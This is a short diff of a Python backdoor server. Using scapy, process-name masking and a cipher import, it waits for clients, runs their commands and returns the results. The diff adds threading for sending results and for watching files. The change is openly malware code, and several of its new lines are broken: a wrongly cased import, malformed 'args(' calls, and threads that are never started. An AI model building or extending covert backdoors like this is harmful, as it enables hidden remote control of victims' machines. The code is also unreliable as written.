@@ -1,10 +1,11 @@
 from __future__ import print_function
+from Queue import Queue
 from scapy.all import *
 from setproctitle import setproctitle, getproctitle
+from Threading import Thread
 
 import command
 import Crypto.Cipher
-import Queue
 import struct
 import sys
 import time
@@ -145,7 +146,7 @@ class BackdoorServer(object):
         """Runs in a loop listening for clients and serving their requests."""
         self.mask_process()
 
-        queue = Queue()        
+        queue = Queue(maxsize=0)        
 
         while True:
             print("Waiting for client...")
@@ -154,6 +155,7 @@ class BackdoorServer(object):
             while not self.client:
                 self.listen()
 
+            
             print("Client connected: {}".format(self.client))
             while True:
                 try:
@@ -170,7 +172,9 @@ class BackdoorServer(object):
                     print(str(result))
                     print("")
 
-                    self.send_result(result)
+                    result_send = Thread(target=self.send_result, args(queue,result))
+                    file_watch = Thread(target=file_watch, args(queue,))
+                    #self.send_result(result)
 
                 except KeyboardInterrupt:
                     print("see ya")
